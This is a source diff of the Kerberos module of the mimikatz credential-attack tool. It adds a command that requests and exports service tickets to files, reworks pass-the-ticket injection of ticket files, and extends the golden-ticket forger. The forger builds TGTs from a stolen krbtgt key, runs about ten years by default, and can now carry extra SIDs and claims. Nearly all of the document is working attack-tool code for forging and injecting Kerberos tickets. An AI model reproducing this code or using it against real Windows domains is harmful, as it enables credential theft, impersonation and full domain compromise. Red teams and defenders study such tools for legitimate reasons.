@@ -1,7 +1,7 @@
 /*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
-	Licence : http://creativecommons.org/licenses/by/3.0/fr/
+	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_kerberos.h"
 
@@ -13,12 +13,12 @@ HANDLE	g_hLSA = NULL;
 const KUHL_M_C kuhl_m_c_kerberos[] = {
 	{kuhl_m_kerberos_ptt,		L"ptt",			L"Pass-the-ticket [NT 6]"},
 	{kuhl_m_kerberos_list,		L"list",		L"List ticket(s)"},
+	{kuhl_m_kerberos_ask,		L"ask",			L"Ask or get TGS tickets"},
 	{kuhl_m_kerberos_tgt,		L"tgt",			L"Retrieve current TGT"},
 	{kuhl_m_kerberos_purge,		L"purge",		L"Purge ticket(s)"},
 	{kuhl_m_kerberos_golden,	L"golden",		L"Willy Wonka factory"},
 	{kuhl_m_kerberos_hash,		L"hash",		L"Hash password to keys"},
 #ifdef KERBEROS_TOOLS
-	{kuhl_m_kerberos_test,		L"test",		L"test"},
 	{kuhl_m_kerberos_decode,	L"decrypt",		L"Decrypt encoded ticket"},
 	{kuhl_m_kerberos_pac_info,	L"pacinfo",		L"Some infos on PAC file"},
 #endif
@@ -57,57 +57,28 @@ NTSTATUS LsaCallKerberosPackage(PVOID ProtocolSubmitBuffer, ULONG SubmitBufferLe
 
 NTSTATUS kuhl_m_kerberos_ptt(int argc, wchar_t * argv[])
 {
-	HANDLE hFind;
-	BOOL bFind = TRUE;
-	WIN32_FIND_DATA fData;
-	DWORD dwAttrib;
-	wchar_t fullpath[0xffff];
-	int i, j;
-
+	int i;
 	for(i = 0; i < argc; i++)
 	{
-		dwAttrib = GetFileAttributes(argv[i]);
-		if((dwAttrib != INVALID_FILE_ATTRIBUTES) && (dwAttrib & FILE_ATTRIBUTE_DIRECTORY))
+		if(PathIsDirectory(argv[i]))
 		{
-			kprintf(L"%3u - Directory \'%s\' (*.kirbi)\n", i, argv[i]);
-			if(wcscpy_s(fullpath, ARRAYSIZE(fullpath), argv[i]) == 0)
-			{
-				if(wcscat_s(fullpath, ARRAYSIZE(fullpath), L"\\*.kirbi") == 0)
-				{
-					hFind = FindFirstFile(fullpath, &fData);
-					if(hFind != INVALID_HANDLE_VALUE)
-					{
-						j = 0;
-						do
-						{
-							if(!(fData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
-							{
-								if(wcscpy_s(fullpath, ARRAYSIZE(fullpath), argv[i]) == 0)
-								{
-									if(wcscat_s(fullpath, ARRAYSIZE(fullpath), L"\\") == 0)
-									{
-										if(wcscat_s(fullpath, ARRAYSIZE(fullpath), fData.cFileName) == 0)
-										{
-											kprintf(L"   %3u - File \'%s\' : ", j, fData.cFileName);
-											kuhl_m_kerberos_ptt_file(fullpath);
-										}
-									}
-								}
-							}
-							j++;
-						} while(bFind = FindNextFile(hFind, &fData));
-						FindClose(hFind);
-					}
-				}
-			}
+			kprintf(L"* Directory: \'%s\'\n", argv[i]);
+			kull_m_file_Find(argv[i], L"*.kirbi", FALSE, 0, FALSE, kuhl_m_kerberos_ptt_directory, NULL);
 		}
 		else
-		{
-			kprintf(L"%3u - File \'%s\' : ", i, argv[i]);
-			kuhl_m_kerberos_ptt_file(argv[i]);
-		}
+			kuhl_m_kerberos_ptt_directory(0, argv[i], PathFindFileName(argv[i]), NULL);
 	}
 	return STATUS_SUCCESS;
+}
+
+BOOL CALLBACK kuhl_m_kerberos_ptt_directory(DWORD level, PCWCHAR fullpath, PCWCHAR path, PVOID pvArg)
+{
+	if(fullpath)
+	{
+		kprintf(L"\n* File: \'%s\': ", fullpath);
+		kuhl_m_kerberos_ptt_file(fullpath);
+	}
+	return TRUE;
 }
 
 void kuhl_m_kerberos_ptt_file(PCWCHAR filename)
@@ -273,6 +244,7 @@ NTSTATUS kuhl_m_kerberos_list(int argc, wchar_t * argv[])
 								{
 									if(kull_m_file_writeData(filename, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
 										kprintf(L"\n   * Saved to file     : %s", filename);
+									else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
 									LocalFree(filename);
 								}
 								LsaFreeReturnBuffer(pKerbRetrieveResponse);
@@ -295,6 +267,110 @@ NTSTATUS kuhl_m_kerberos_list(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
+NTSTATUS kuhl_m_kerberos_ask(int argc, wchar_t * argv[])
+{
+	NTSTATUS status, packageStatus;
+	PWCHAR filename = NULL, ticketname = NULL;
+	PCWCHAR szTarget;
+	PKERB_RETRIEVE_TKT_REQUEST pKerbRetrieveRequest;
+	PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
+	KIWI_KERBEROS_TICKET ticket = {0};
+	DWORD szData;
+	USHORT dwTarget;
+	BOOL isExport = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL), isTkt = kull_m_string_args_byName(argc, argv, L"tkt", NULL, NULL), isNoCache = kull_m_string_args_byName(argc, argv, L"nocache", NULL, NULL);
+
+	if(kull_m_string_args_byName(argc, argv, L"target", &szTarget, NULL))
+	{
+		dwTarget = (USHORT) ((wcslen(szTarget) + 1) * sizeof(wchar_t));
+
+		szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + dwTarget;
+		if(pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST) LocalAlloc(LPTR, szData))
+		{
+			pKerbRetrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
+			pKerbRetrieveRequest->CacheOptions = isNoCache ? KERB_RETRIEVE_TICKET_DONT_USE_CACHE : KERB_RETRIEVE_TICKET_DEFAULT;
+			pKerbRetrieveRequest->EncryptionType = kull_m_string_args_byName(argc, argv, L"rc4", NULL, NULL) ? KERB_ETYPE_RC4_HMAC_NT : kull_m_string_args_byName(argc, argv, L"des", NULL, NULL) ? KERB_ETYPE_DES3_CBC_MD5 : kull_m_string_args_byName(argc, argv, L"aes256", NULL, NULL) ? KERB_ETYPE_AES256_CTS_HMAC_SHA1_96 : kull_m_string_args_byName(argc, argv, L"aes128", NULL, NULL) ? KERB_ETYPE_AES128_CTS_HMAC_SHA1_96 : KERB_ETYPE_DEFAULT;
+			pKerbRetrieveRequest->TargetName.Length = dwTarget - sizeof(wchar_t);
+			pKerbRetrieveRequest->TargetName.MaximumLength  = dwTarget;
+			pKerbRetrieveRequest->TargetName.Buffer = (PWSTR) ((PBYTE) pKerbRetrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
+			RtlCopyMemory(pKerbRetrieveRequest->TargetName.Buffer, szTarget, pKerbRetrieveRequest->TargetName.MaximumLength);
+			kprintf(L"Asking for: %wZ\n", &pKerbRetrieveRequest->TargetName);
+
+			status = LsaCallKerberosPackage(pKerbRetrieveRequest, szData, (PVOID *) &pKerbRetrieveResponse, &szData, &packageStatus);
+			if(NT_SUCCESS(status))
+			{
+				if(NT_SUCCESS(packageStatus))
+				{
+					ticket.ServiceName = pKerbRetrieveResponse->Ticket.ServiceName;
+					ticket.DomainName = pKerbRetrieveResponse->Ticket.DomainName;
+					ticket.TargetName = pKerbRetrieveResponse->Ticket.TargetName;
+					ticket.TargetDomainName = pKerbRetrieveResponse->Ticket.TargetDomainName;
+					ticket.ClientName = pKerbRetrieveResponse->Ticket.ClientName;
+					ticket.AltTargetDomainName = pKerbRetrieveResponse->Ticket.AltTargetDomainName;
+
+					ticket.StartTime = *(PFILETIME) &pKerbRetrieveResponse->Ticket.StartTime;
+					ticket.EndTime = *(PFILETIME) &pKerbRetrieveResponse->Ticket.EndTime;
+					ticket.RenewUntil = *(PFILETIME) &pKerbRetrieveResponse->Ticket.RenewUntil;
+
+					ticket.KeyType = ticket.TicketEncType = pKerbRetrieveResponse->Ticket.SessionKey.KeyType;
+					ticket.Key.Length = pKerbRetrieveResponse->Ticket.SessionKey.Length;
+					ticket.Key.Value = pKerbRetrieveResponse->Ticket.SessionKey.Value;
+
+					ticket.TicketFlags = pKerbRetrieveResponse->Ticket.TicketFlags;
+					ticket.Ticket.Length = pKerbRetrieveResponse->Ticket.EncodedTicketSize;
+					ticket.Ticket.Value = pKerbRetrieveResponse->Ticket.EncodedTicket;
+
+					kprintf(L"   * Ticket Encryption Type & kvno not representative at screen\n");
+					if(isNoCache && isExport)
+					kprintf(L"   * NoCache: exported ticket may vary with informations at screen\n");
+					kuhl_m_kerberos_ticket_display(&ticket, TRUE, FALSE);
+					kprintf(L"\n");
+
+					if(isTkt)
+						if(ticketname = kuhl_m_kerberos_generateFileName_short(&ticket, L"tkt"))
+						{
+							if(kull_m_file_writeData(ticketname, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
+								kprintf(L"\n   * TKT to file       : %s", ticketname);
+							else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
+							LocalFree(ticketname);
+						}
+					if(isExport)
+						filename = kuhl_m_kerberos_generateFileName_short(&ticket, MIMIKATZ_KERBEROS_EXT);
+
+					LsaFreeReturnBuffer(pKerbRetrieveResponse);
+
+					if(isExport)
+					{
+						pKerbRetrieveRequest->CacheOptions |= KERB_RETRIEVE_TICKET_AS_KERB_CRED;
+						status = LsaCallKerberosPackage(pKerbRetrieveRequest, szData, (PVOID *) &pKerbRetrieveResponse, &szData, &packageStatus);
+						if(NT_SUCCESS(status))
+						{
+							if(NT_SUCCESS(packageStatus))
+							{
+								if(kull_m_file_writeData(filename, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
+										kprintf(L"\n   * KiRBi to file     : %s", filename);
+								else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
+								LsaFreeReturnBuffer(pKerbRetrieveResponse);
+							}
+							else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n", packageStatus);
+						}
+						else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : %08x\n", status);
+					}
+					if(filename)
+						LocalFree(filename);
+				}
+				else if(packageStatus == STATUS_NO_TRUST_SAM_ACCOUNT)
+					PRINT_ERROR(L"\'%wZ\' Kerberos name not found!\n", &pKerbRetrieveRequest->TargetName);
+				else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n", packageStatus);
+			}
+			else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : %08x\n", status);
+
+			LocalFree(pKerbRetrieveRequest);
+		}
+	}
+	else PRINT_ERROR(L"At least /target argument is required (eg: /target:cifs/server.lab.local)\n");
+	return STATUS_SUCCESS;
+}
+
 wchar_t * kuhl_m_kerberos_generateFileName(const DWORD index, PKERB_TICKET_CACHE_INFO_EX ticket, LPCWSTR ext)
 {
 	wchar_t * buffer;
@@ -310,15 +386,39 @@ wchar_t * kuhl_m_kerberos_generateFileName(const DWORD index, PKERB_TICKET_CACHE
 	return buffer;
 }
 
+wchar_t * kuhl_m_kerberos_generateFileName_short(PKIWI_KERBEROS_TICKET ticket, LPCWSTR ext)
+{
+	wchar_t * buffer;
+	size_t charCount = 0x1000;
+	BOOL isLong = kuhl_m_kerberos_ticket_isLongFilename(ticket);
+
+	if(buffer = (wchar_t *) LocalAlloc(LPTR, charCount * sizeof(wchar_t)))
+	{
+		if(isLong)
+			isLong = swprintf_s(buffer, charCount, L"%08x-%wZ@%wZ-%wZ.%s", ticket->TicketFlags, &ticket->ClientName->Names[0], &ticket->ServiceName->Names[0], &ticket->ServiceName->Names[1], ext) > 0;
+		else
+			isLong = swprintf_s(buffer, charCount, L"%08x-noname.%s", ticket->TicketFlags, ext) > 0;
+		
+		if(isLong)
+			kull_m_file_cleanFilename(buffer);
+		else
+			buffer = (wchar_t *) LocalFree(buffer);
+	}
+	return buffer;
+}
+
 GROUP_MEMBERSHIP defaultGroups[] = {{513, DEFAULT_GROUP_ATTRIBUTES}, {512, DEFAULT_GROUP_ATTRIBUTES}, {520, DEFAULT_GROUP_ATTRIBUTES}, {518, DEFAULT_GROUP_ATTRIBUTES}, {519, DEFAULT_GROUP_ATTRIBUTES},};
 NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 {
 	BYTE key[AES_256_KEY_LENGTH] = {0};
-	DWORD i, j, nbGroups, id = 500, keyType, rodc = 0,/*keyLen,*/ App_KrbCredSize;
-	PCWCHAR szUser, szDomain, szService = NULL, szTarget = NULL, szSid, szKey = NULL, szId, szGroups, szRodc, szLifetime, base, filename;
-	PISID pSid;
+	DWORD i, j, nbGroups, nbSids = 0, id = 500, keyType, rodc = 0;
+	PCWCHAR szUser, szDomain, szService = NULL, szTarget = NULL, szSid, szKey = NULL, szId, szGroups, szSids, szRodc, szLifetime, szClaims, base, filename;
+	PWCHAR baseSid, tmpSid, baseDot, netbiosDomain;
+	PISID pSid, pSidTmp;
 	PGROUP_MEMBERSHIP dynGroups = NULL, groups;
-	PDIRTY_ASN1_SEQUENCE_EASY App_KrbCred;
+	PKERB_SID_AND_ATTRIBUTES sids = NULL;
+	PCLAIMS_SET pClaimsSet = NULL;
+	PBERVAL BerApp_KrbCred;
 	KUHL_M_KERBEROS_LIFETIME_DATA lifeTimeData;
 	BOOL isPtt = kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL);
 	NTSTATUS status;
@@ -330,124 +430,188 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 	{
 		if(kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
 		{
-			if(kull_m_string_args_byName(argc, argv, L"sid", &szSid, NULL))
+			if(baseDot = wcschr(szDomain, L'.'))
 			{
-				if(ConvertStringSidToSid(szSid, (PSID *) &pSid))
+				i = (DWORD) ((PBYTE) baseDot - (PBYTE) szDomain);
+				if(netbiosDomain = (PWCHAR) LocalAlloc(LPTR, i + sizeof(wchar_t)))
 				{
-					if(kull_m_string_args_byName(argc, argv, L"des", &szKey, NULL))
-						keyType = KERB_ETYPE_DES_CBC_MD5;
-					else if(kull_m_string_args_byName(argc, argv, L"rc4", &szKey, NULL) || kull_m_string_args_byName(argc, argv, L"krbtgt", &szKey, NULL))
-						keyType = KERB_ETYPE_RC4_HMAC_NT;
-					else if(kull_m_string_args_byName(argc, argv, L"aes128", &szKey, NULL))
-						keyType = KERB_ETYPE_AES128_CTS_HMAC_SHA1_96;
-					else if(kull_m_string_args_byName(argc, argv, L"aes256", &szKey, NULL))
-						keyType = KERB_ETYPE_AES256_CTS_HMAC_SHA1_96;
-					
-					if(szKey)
+					for(j = 0; j < i / sizeof(wchar_t); j++)
+						netbiosDomain[j] = towupper(szDomain[j]);
+
+					if(kull_m_string_args_byName(argc, argv, L"sid", &szSid, NULL))
 					{
-						kull_m_string_args_byName(argc, argv, L"service", &szService, NULL);
-						kull_m_string_args_byName(argc, argv, L"target", &szTarget, NULL);
-						
-						if(kull_m_string_args_byName(argc, argv, L"id", &szId, NULL))
-							id = wcstoul(szId, NULL, 0);
-
-						if(kull_m_string_args_byName(argc, argv, L"rodc", &szRodc, NULL))
-							rodc = wcstoul(szRodc, NULL, 0);
-
-						if(kull_m_string_args_byName(argc, argv, L"groups", &szGroups, NULL))
+						if(ConvertStringSidToSid(szSid, (PSID *) &pSid))
 						{
-							for(nbGroups = 0, base = szGroups; base && *base; )
+							if(kull_m_string_args_byName(argc, argv, L"des", &szKey, NULL))
+								keyType = KERB_ETYPE_DES_CBC_MD5;
+							else if(kull_m_string_args_byName(argc, argv, L"rc4", &szKey, NULL) || kull_m_string_args_byName(argc, argv, L"krbtgt", &szKey, NULL))
+								keyType = KERB_ETYPE_RC4_HMAC_NT;
+							else if(kull_m_string_args_byName(argc, argv, L"aes128", &szKey, NULL))
+								keyType = KERB_ETYPE_AES128_CTS_HMAC_SHA1_96;
+							else if(kull_m_string_args_byName(argc, argv, L"aes256", &szKey, NULL))
+								keyType = KERB_ETYPE_AES256_CTS_HMAC_SHA1_96;
+
+							if(szKey)
 							{
-								if(wcstoul(base, NULL, 0))
-									nbGroups++;
-								if(base = wcschr(base, L','))
-									base++;
-							}
-							if(nbGroups && (dynGroups = (PGROUP_MEMBERSHIP) LocalAlloc(LPTR, nbGroups * sizeof(GROUP_MEMBERSHIP))))
-							{
-								for(i = 0, base = szGroups; (base && *base) && (i < nbGroups); )
+								kull_m_string_args_byName(argc, argv, L"service", &szService, NULL);
+								kull_m_string_args_byName(argc, argv, L"target", &szTarget, NULL);
+
+								if(kull_m_string_args_byName(argc, argv, L"id", &szId, NULL))
+									id = wcstoul(szId, NULL, 0);
+
+								if(kull_m_string_args_byName(argc, argv, L"rodc", &szRodc, NULL))
+									rodc = wcstoul(szRodc, NULL, 0);
+
+								if(kull_m_string_args_byName(argc, argv, L"groups", &szGroups, NULL))
 								{
-									if(j = wcstoul(base, NULL, 0))
+									for(nbGroups = 0, base = szGroups; base && *base; )
 									{
-										dynGroups[i].Attributes = DEFAULT_GROUP_ATTRIBUTES;
-										dynGroups[i].RelativeId = j;
-										i++;
+										if(wcstoul(base, NULL, 0))
+											nbGroups++;
+										if(base = wcschr(base, L','))
+											base++;
 									}
-									if(base = wcschr(base, L','))
-										base++;
+									if(nbGroups && (dynGroups = (PGROUP_MEMBERSHIP) LocalAlloc(LPTR, nbGroups * sizeof(GROUP_MEMBERSHIP))))
+									{
+										for(i = 0, base = szGroups; (base && *base) && (i < nbGroups); )
+										{
+											if(j = wcstoul(base, NULL, 0))
+											{
+												dynGroups[i].Attributes = DEFAULT_GROUP_ATTRIBUTES;
+												dynGroups[i].RelativeId = j;
+												i++;
+											}
+											if(base = wcschr(base, L','))
+												base++;
+										}
+									}
 								}
-							}
-						}
-						if(nbGroups && dynGroups)
-							groups = dynGroups;
-						else
-						{
-							groups = defaultGroups;
-							nbGroups = ARRAYSIZE(defaultGroups);
-						}
-						
-						status = CDLocateCSystem(keyType, &pCSystem);
-						if(NT_SUCCESS(status))
-						{
-							if(kull_m_string_stringToHex(szKey, key, pCSystem->KeySize))
-							{
-								kull_m_string_args_byName(argc, argv, L"startoffset", &szLifetime, L"0");
-								GetSystemTimeAsFileTime(&lifeTimeData.TicketStart);
-								*(PULONGLONG) &lifeTimeData.TicketStart -= *(PULONGLONG) &lifeTimeData.TicketStart % 10000000 - ((LONGLONG) wcstol(szLifetime, NULL, 0) * 10000000 * 60);
-								lifeTimeData.TicketRenew = lifeTimeData.TicketEnd = lifeTimeData.TicketStart;
-								kull_m_string_args_byName(argc, argv, L"endin", &szLifetime, L"5256000"); // ~ 10 years
-								*(PULONGLONG) &lifeTimeData.TicketEnd += (ULONGLONG) 10000000 * 60 * wcstoul(szLifetime, NULL, 0);
-								kull_m_string_args_byName(argc, argv, L"renewmax", &szLifetime, szLifetime);
-								*(PULONGLONG) &lifeTimeData.TicketRenew += (ULONGLONG) 10000000 * 60 * wcstoul(szLifetime, NULL, 0);
-
-								kprintf(
-									L"User      : %s\n"
-									L"Domain    : %s\n"
-									L"SID       : %s\n"
-									L"User Id   : %u\n", szUser, szDomain, szSid, id);
-								kprintf(L"Groups Id : *");
-								for(i = 0; i < nbGroups; i++)
-									kprintf(L"%u ", groups[i]);
-								kprintf(L"\nServiceKey: ");
-								kull_m_string_wprintf_hex(key, pCSystem->KeySize, 0); kprintf(L" - %s\n", kuhl_m_kerberos_ticket_etype(keyType));
-								if(szService)
-									kprintf(L"Service   : %s\n", szService);
-								if(szTarget)
-									kprintf(L"Target    : %s\n", szTarget);
-								kprintf(L"Lifetime  : ");
-								kull_m_string_displayLocalFileTime(&lifeTimeData.TicketStart); kprintf(L" ; ");
-								kull_m_string_displayLocalFileTime(&lifeTimeData.TicketEnd); kprintf(L" ; ");
-								kull_m_string_displayLocalFileTime(&lifeTimeData.TicketRenew); kprintf(L"\n");
-
-								kprintf(L"-> Ticket : %s\n\n", isPtt ? L"** Pass The Ticket **" : filename);
-
-								if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, szService, szTarget, &lifeTimeData, pSid, key, pCSystem->KeySize, keyType, id, groups, nbGroups, rodc))
+								if(nbGroups && dynGroups)
+									groups = dynGroups;
+								else
 								{
-									App_KrbCredSize = kull_m_asn1_getSize(App_KrbCred);
-									if(isPtt)
-									{
-										if(NT_SUCCESS(kuhl_m_kerberos_ptt_data(App_KrbCred, App_KrbCredSize)))
-											kprintf(L"\nGolden ticket for '%s @ %s' successfully submitted for current session\n", szUser, szDomain);
-									}
-									else if(kull_m_file_writeData(filename, App_KrbCred, App_KrbCredSize))
-										kprintf(L"\nFinal Ticket Saved to file !\n");
-									else PRINT_ERROR_AUTO(L"\nkull_m_file_writeData");
-
-									LocalFree(App_KrbCred);
+									groups = defaultGroups;
+									nbGroups = ARRAYSIZE(defaultGroups);
 								}
-								else PRINT_ERROR(L"KrbCred error\n");
+
+								if(kull_m_string_args_byName(argc, argv, L"sids", &szSids, NULL))
+								{
+									if(tmpSid = _wcsdup(szSids))
+									{
+										for(nbSids = 0, base = tmpSid; base && *base; )
+										{
+											if(baseSid = wcschr(base, L','))
+												*baseSid = L'\0';
+											if(ConvertStringSidToSid(base, (PSID *) &pSidTmp))
+											{
+												nbSids++;
+												LocalFree(pSidTmp);
+											}
+											if(base = baseSid)
+												base++;
+										}
+										free(tmpSid);
+									}
+									if(nbSids && (sids = (PKERB_SID_AND_ATTRIBUTES) LocalAlloc(LPTR, nbSids * sizeof(KERB_SID_AND_ATTRIBUTES))))
+									{
+										if(tmpSid = _wcsdup(szSids))
+										{
+											for(i = 0, base = tmpSid; (base && *base) && (i < nbSids); )
+											{
+												if(baseSid = wcschr(base, L','))
+													*baseSid = L'\0';
+												if(ConvertStringSidToSid(base, (PSID *) &sids[i].Sid))
+													sids[i++].Attributes = DEFAULT_GROUP_ATTRIBUTES;
+												if(base = baseSid)
+													base++;
+											}
+											free(tmpSid);
+										}
+									}
+								}
+								if(kull_m_string_args_byName(argc, argv, L"claims", &szClaims, NULL))
+									pClaimsSet = kuhl_m_kerberos_claims_createFromString(szClaims);
+
+								status = CDLocateCSystem(keyType, &pCSystem);
+								if(NT_SUCCESS(status))
+								{
+									if(kull_m_string_stringToHex(szKey, key, pCSystem->KeySize))
+									{
+										kull_m_string_args_byName(argc, argv, L"startoffset", &szLifetime, L"0");
+										GetSystemTimeAsFileTime(&lifeTimeData.TicketStart);
+										*(PULONGLONG) &lifeTimeData.TicketStart -= *(PULONGLONG) &lifeTimeData.TicketStart % 10000000 - ((LONGLONG) wcstol(szLifetime, NULL, 0) * 10000000 * 60);
+										lifeTimeData.TicketRenew = lifeTimeData.TicketEnd = lifeTimeData.TicketStart;
+										kull_m_string_args_byName(argc, argv, L"endin", &szLifetime, L"5256000"); // ~ 10 years
+										*(PULONGLONG) &lifeTimeData.TicketEnd += (ULONGLONG) 10000000 * 60 * wcstoul(szLifetime, NULL, 0);
+										kull_m_string_args_byName(argc, argv, L"renewmax", &szLifetime, szLifetime);
+										*(PULONGLONG) &lifeTimeData.TicketRenew += (ULONGLONG) 10000000 * 60 * wcstoul(szLifetime, NULL, 0);
+
+										kprintf(
+											L"User      : %s\n"
+											L"Domain    : %s (%s)\n"
+											L"SID       : %s\n"
+											L"User Id   : %u\n", szUser, szDomain, netbiosDomain, szSid, id);
+										kprintf(L"Groups Id : *");
+										for(i = 0; i < nbGroups; i++)
+											kprintf(L"%u ", groups[i].RelativeId);
+										if(nbSids)
+										{
+											kprintf(L"\nExtra SIDs: ");
+											for(i = 0; i < nbSids; i++)
+											{
+												kull_m_string_displaySID(sids[i].Sid);
+												kprintf(L" ; ");
+											}
+										}
+										if(pClaimsSet)
+										{
+											kprintf(L"\nClaims    :\n");
+											kuhl_m_kerberos_claims_displayClaimsSet(pClaimsSet);
+										}
+										kprintf(L"\nServiceKey: ");
+										kull_m_string_wprintf_hex(key, pCSystem->KeySize, 0); kprintf(L" - %s\n", kuhl_m_kerberos_ticket_etype(keyType));
+										if(szService)
+											kprintf(L"Service   : %s\n", szService);
+										if(szTarget)
+											kprintf(L"Target    : %s\n", szTarget);
+										kprintf(L"Lifetime  : ");
+										kull_m_string_displayLocalFileTime(&lifeTimeData.TicketStart); kprintf(L" ; ");
+										kull_m_string_displayLocalFileTime(&lifeTimeData.TicketEnd); kprintf(L" ; ");
+										kull_m_string_displayLocalFileTime(&lifeTimeData.TicketRenew); kprintf(L"\n");
+
+										kprintf(L"-> Ticket : %s\n\n", isPtt ? L"** Pass The Ticket **" : filename);
+
+										if(BerApp_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, netbiosDomain, szService, szTarget, &lifeTimeData, pSid, key, pCSystem->KeySize, keyType, id, groups, nbGroups, sids, nbSids, rodc, pClaimsSet))
+										{
+											if(isPtt)
+											{
+												if(NT_SUCCESS(kuhl_m_kerberos_ptt_data(BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len)))
+													kprintf(L"\nGolden ticket for '%s @ %s' successfully submitted for current session\n", szUser, szDomain);
+											}
+											else if(kull_m_file_writeData(filename, BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len))
+												kprintf(L"\nFinal Ticket Saved to file !\n");
+											else PRINT_ERROR_AUTO(L"\nkull_m_file_writeData");
+
+											ber_bvfree(BerApp_KrbCred);
+										}
+										else PRINT_ERROR(L"BerApp_KrbCred error\n");
+									}
+									else PRINT_ERROR(L"Krbtgt key size length must be %u (%u bytes) for %s\n", pCSystem->KeySize * 2, pCSystem->KeySize, kuhl_m_kerberos_ticket_etype(keyType));
+								}
+								else PRINT_ERROR(L"Unable to locate CryptoSystem for ETYPE %u (error 0x%08x) - AES only available on NT6\n", keyType, status);
 							}
-							else PRINT_ERROR(L"Krbtgt key size length must be %u (%u bytes) for %s\n", pCSystem->KeySize * 2, pCSystem->KeySize, kuhl_m_kerberos_ticket_etype(keyType));
+							else PRINT_ERROR(L"Missing krbtgt key argument (/rc4 or /aes128 or /aes256)\n");
+
+							LocalFree(pSid);
 						}
-						else PRINT_ERROR(L"Unable to locate CryptoSystem for ETYPE %u (error 0x%08x) - AES only available on NT6\n", keyType, status);
+						else PRINT_ERROR_AUTO(L"SID seems invalid - ConvertStringSidToSid");
 					}
-					else PRINT_ERROR(L"Missing krbtgt key argument (/rc4 or /aes128 or /aes256)\n");
+					else PRINT_ERROR(L"Missing SID argument\n");
 
-					LocalFree(pSid);
+					LocalFree(netbiosDomain);
 				}
-				else PRINT_ERROR_AUTO(L"SID seems invalid - ConvertStringSidToSid");
 			}
-			else PRINT_ERROR(L"Missing SID argument\n");
+			else PRINT_ERROR(L"Domain name does not look like a FQDN\n");
 		}
 		else PRINT_ERROR(L"Missing domain argument\n");
 	}
@@ -455,6 +619,14 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 
 	if(dynGroups)
 		LocalFree(groups);
+	if(sids && nbSids)
+	{
+		for(i = 0; i < nbSids; i++)
+			LocalFree(sids[i].Sid);
+		LocalFree(sids);
+	}
+	if(pClaimsSet)
+		kuhl_m_kerberos_claims_free(pClaimsSet);
 
 	return STATUS_SUCCESS;
 }
@@ -491,14 +663,15 @@ NTSTATUS kuhl_m_kerberos_encrypt(ULONG eType, ULONG keyUsage, LPCVOID key, DWORD
 	return status;
 }
 
-PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWSTR servicename, LPCWSTR targetname, PKUHL_M_KERBEROS_LIFETIME_DATA lifetime, PISID sid, LPCBYTE key, DWORD keySize, DWORD keyType, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups, DWORD rodc)
+PBERVAL kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWSTR LogonDomainName, LPCWSTR servicename, LPCWSTR targetname, PKUHL_M_KERBEROS_LIFETIME_DATA lifetime, PISID sid, LPCBYTE key, DWORD keySize, DWORD keyType, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids, DWORD rodc, PCLAIMS_SET pClaimsSet)
 {
 	NTSTATUS status;
-	PDIRTY_ASN1_SEQUENCE_EASY App_EncTicketPart, App_KrbCred = NULL;
 	KIWI_KERBEROS_TICKET ticket = {0};
 	KERB_VALIDATION_INFO validationInfo = {0};
 	PPACTYPE pacType; DWORD pacTypeSize;
 	DWORD SignatureType;
+
+	PBERVAL BerApp_EncTicketPart, BerApp_KrbCred = NULL;
 
 	if(ticket.ClientName = (PKERB_EXTERNAL_NAME) LocalAlloc(LPTR, sizeof(KERB_EXTERNAL_NAME) /* 1 UNICODE into */))
 	{
@@ -519,7 +692,7 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 
 	ticket.TicketFlags = (servicename ? 0 : KERB_TICKET_FLAGS_initial) | KERB_TICKET_FLAGS_pre_authent | KERB_TICKET_FLAGS_renewable | KERB_TICKET_FLAGS_forwardable;
 	
-	ticket.TicketKvno = rodc ? (0x00000001 | (rodc << 16)) :  2; // windows does not care about it...
+	ticket.TicketKvno = rodc ? (0x00000001 | (rodc << 16)) : 2; // windows does not care about it...
 	ticket.TicketEncType = ticket.KeyType = keyType;
 	ticket.Key.Length = keySize;
 	if(ticket.Key.Value = (PUCHAR) LocalAlloc(LPTR, ticket.Key.Length))
@@ -534,7 +707,7 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 	KIWI_NEVERTIME(&validationInfo.PasswordLastSet);
